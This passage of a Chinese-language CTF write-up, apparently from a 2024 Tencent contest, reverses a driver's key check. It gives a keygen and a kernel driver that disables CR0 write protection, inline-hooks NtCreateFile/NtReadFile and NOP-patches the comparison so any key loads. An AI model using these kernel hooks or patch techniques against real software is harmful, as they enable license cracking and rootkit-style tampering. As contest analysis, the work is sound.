DbgBreakPoint();</span><br><span class="line">        FileHandler = *FileHandle;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//DbgBreakPoint();</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Hook();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ULONG <span class="title function_">myReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Unhook2();</span><br><span class="line">    FuncPtr2 func = (FuncPtr2)target2;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (FileHandler &amp;&amp; FileHandler == FileHandle) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;call NtReadFile(%p,%p,%p,%p,%p,%p,%p,%p,%p)\n&quot;</span>), FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, Buffer, Length, ByteOffset, Key);</span><br><span class="line">        DbgBreakPoint();</span><br><span class="line">        FileHandler = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DbgBreakPoint();</span></span><br><span class="line">    NTSTATUS s = func(FileHandle,Event,ApcRoutine,ApcContext,IoStatusBlock,Buffer,Length,ByteOffset,Key);</span><br><span class="line">    </span><br><span class="line">    Hook2();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start unload\n&quot;</span>), __LINE__);</span><br><span class="line">    Unhook();</span><br><span class="line">    Unhook2();</span><br><span class="line">    DeleteDevice(pDriver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: RegistryPath = %S\n&quot;</span>), __LINE__, RegistryPath-&gt;Buffer);</span><br><span class="line">    target = NtCreateFile;</span><br><span class="line">    target2 = NtReadFile;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: NtCreateFile=%p NtReadFile=%p\n&quot;</span>), __LINE__, target,target2);</span><br><span class="line">    g_Object = DriverObject;</span><br><span class="line">    <span class="keyword">if</span> (target&amp;&amp;target2) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(oldcode); i++) &#123;</span><br><span class="line">            oldcode[i] = target[i];</span><br><span class="line">            oldcode2[i] = target2[i];</span><br><span class="line">        &#125;</span><br><span class="line">        *(UINT64*)(newcode + <span class="number">2</span>) = myCreateFile;</span><br><span class="line">        *(UINT64*)(newcode2 + <span class="number">2</span>) = myReadFile;</span><br><span class="line">        Hook();</span><br><span class="line">        Hook2();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;xia0ji233:hahaha&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟到后面可以找到文件内容（ReadFile第六个参数），在文件内容处下硬件读取断点，可以找到这里文件内容被被写入两个寄存器，随后又写入另外的内存（RCX所指向的内存）。</p><img src="/2024/04/22/tencent-race-2024-pre-final/1.png" class=""><p>然后就直接 ret 了，这里将内存窗口转到 RCX 指向的地址，然后程序跳出来。</p><p>紧接着给末尾添 0 字节，然后将 r14 与 0x10 比较，小于跳出</p><img src="/2024/04/22/tencent-race-2024-pre-final/2.png" class=""><p>这一次输出失败了，于是考虑换长度但是改一个字符，发现在另外的位置写了零字节</p><img src="/2024/04/22/tencent-race-2024-pre-final/3.png" class=""><p>在跟的过程中，发现后面的一个内存就是长度</p><img src="/2024/04/22/tencent-race-2024-pre-final/4.png" class=""><p>然后接着跟，会跟到一个找 - 的代码</p><img src="/2024/04/22/tencent-race-2024-pre-final/5.png" class=""><p>很容易理解，因为 - 就是分隔 user 和 key 的，必然有一个遍历在找 - 的位置，那就直接跳到它找到了 - 的位置，发现有一个大跳转</p><img src="/2024/04/22/tencent-race-2024-pre-final/6.png" class=""><p>随后会把 - 所处的地址存入栈中</p><img src="/2024/04/22/tencent-race-2024-pre-final/7.png" class=""><p>紧接着跟，发现把User拷贝到下面的内存了</p><img src="/2024/04/22/tencent-race-2024-pre-final/8.png" class=""><p>随后将key也写入下方的内存</p><img src="/2024/04/22/tencent-race-2024-pre-final/9.png" class=""><p>然后开始循环 key，判断如果 -0x30 是否 &gt;10，应该 key 只能是数字的判断。</p><p>于是我在循环这里下了一个软件断点，发现 RDI 会存储当前已遍历的十进制。</p><img src="/2024/04/22/tencent-race-2024-pre-final/11.png" class=""><p>例如现在已经遍历到了 405，那么 rdi&#x3D;0x195&#x3D;405。</p><p>经过数次的循环，</p><img src="/2024/04/22/tencent-race-2024-pre-final/12.png" class=""><p>可以发现 RDI&#x3D;0xF17E203C，就是 4051574844，那么接下来就往下面跟看看跟 User 有什么样的关系。</p><img src="/2024/04/22/tencent-race-2024-pre-final/13.png" class=""><p>取出ACE之后算出一个值 0x0000000020450083，最后很 0x1003F 相乘，得到 00000000F17E203D，刚好是题目所给 key 的十六进制表示。</p><p>后面通过一定的调试分析，发现一个规律</p><img src="/2024/04/22/tencent-race-2024-pre-final/14.png" class=""><p>似乎它会把每一个字符加起来然后 <code>*0x1003F</code>，并且一定是 <code>int</code>。</p><p>先验证一遍ACE是否正确</p><img src="/2024/04/22/tencent-race-2024-pre-final/15.png" class=""><p>发现果然如此，那么照样子算出 key 为 <code>4007951923</code>。</p><h4 id="编写一个keygen，能生成对于任何用户名的KEY（1分）"><a href="#编写一个keygen，能生成对于任何用户名的KEY（1分）" class="headerlink" title="编写一个keygen，能生成对于任何用户名的KEY（1分）"></a>编写一个keygen，能生成对于任何用户名的KEY（1分）</h4><p>根据上面的分析，不难写出 keygen 程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">char</span> user[]=<span class="string">&quot;xia0ji233&quot;</span>;</span><br><span class="line"><span class="type">int</span> n=<span class="built_in">strlen</span>(user);</span><br><span class="line"><span class="type">unsigned</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">key=(key+user[i])*<span class="number">0x1003F</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%u\n&quot;</span>,key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可获得 key 的输出。</p><h4 id="编写一个exp，在exp程序运行后，对于任意的用户名-key，Loader-sys均能正确启动（1分）"><a href="#编写一个exp，在exp程序运行后，对于任意的用户名-key，Loader-sys均能正确启动（1分）" class="headerlink" title="编写一个exp，在exp程序运行后，对于任意的用户名-key，Loader.sys均能正确启动（1分）"></a>编写一个exp，在exp程序运行后，对于任意的用户名-key，Loader.sys均能正确启动（1分）</h4><p>有这么几种方法：监控内核线程，在 shellcode 执行的时候拦截，把比较是否相等的代码patch掉。监控文件读写，在读文件的时候，判断如果是目标文件，让它返回正确的结果。</p><p>最后还是选择在文件处拦截，然后趁它读文件的时候遍历驱动模块改它代码，上面分析的 imul 关键指令在 <code>Loader.sys+0xafc1c4</code> 的位置</p><p>再调试一遍，决出关键一步，找到了 cmp 指令</p><img src="/2024/04/22/tencent-race-2024-pre-final/16.png" class=""><p>如图所示的内存分别为实际输入的数值和通过 user 计算得到的key的数值，随后取出相比较，不相等显然跳转到 Fail 分支，因此这里改成 NOP 让它不跳转任意情况下跳转成功。</p><p>此时的 sys 基地址为 <code>0xFFFFF806F82D0000</code>，与该指令相减得到 <code>0xa27e</code> 的偏移，只需把这两个字节改成 0x90 即可达到任意的 user key 可以成功加载驱动。</p><p>我先使用了hook的方式去劫持，确保劫持的函数没错，再通过修改劫持时机和方式让方法满足要求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL <span class="string">L&quot;\\??\\xia0ji2333&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">UINT64 BaseAddr=<span class="literal">NULL</span>, DLLSize=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteDevice</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start delete device\n&quot;</span>), __LINE__);</span><br><span class="line">    <span class="keyword">if</span> (pDriver-&gt;DeviceObject) &#123;</span><br><span class="line">        UNICODE_STRING Sym;</span><br><span class="line">        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span class="comment">//CreateFile </span></span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Symbol\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteSymbolicLink(&amp;Sym);</span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Device\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: end delete device\n&quot;</span>), __LINE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE FileHandler = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> newcode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span><span class="comment">//jmp rax</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> oldcode[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> newcode2[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span><span class="comment">//jmp rax</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> oldcode2[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* target;</span><br><span class="line"><span class="type">char</span>* target2;</span><br><span class="line">KIRQL <span class="title function_">WPOFFx64</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    KIRQL irql = KeRaiseIrqlToDpcLevel();</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 &amp;= <span class="number">0xfffffffffffeffff</span>;</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    _disable();</span><br><span class="line">    <span class="keyword">return</span> irql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WPONx64</span><span class="params">(KIRQL irql)</span></span><br><span class="line">&#123;</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 |= <span class="number">0x10000</span>;</span><br><span class="line">    _enable();</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    KeLowerIrql(irql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = oldcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Unhook2</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode2); i++) &#123;</span><br><span class="line">        target2[i] = oldcode2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Hook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = newcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Hook2</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode2); i++) &#123;</span><br><span class="line">        target2[i] = newcode2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry  </span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(* FuncPtr)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    _Out_ PHANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER AllocationSize,</span></span><br><span class="line"><span class="params">    _In_ ULONG FileAttributes,</span></span><br><span class="line"><span class="params">    _In_ ULONG ShareAccess,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateDisposition,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateOptions,</span></span><br><span class="line"><span class="params">    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG EaLength</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(* FuncPtr2 )</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">EnumerateKernelThreads</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(*ZWQUERYSYSTEMINFORMATION)</span><span class="params">(ULONG, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    LARGE_INTEGER Reserved[<span class="number">3</span>];</span><br><span class="line">    LARGE_INTEGER CreateTime;</span><br><span class="line">    LARGE_INTEGER UserTime;</span><br><span class="line">    LARGE_INTEGER KernelTime;</span><br><span class="line">    UNICODE_STRING ImageName;</span><br><span class="line">    ULONG BasePriority;</span><br><span class="line">    HANDLE ProcessId;</span><br><span class="line">    HANDLE InheritedFromProcessId;</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span 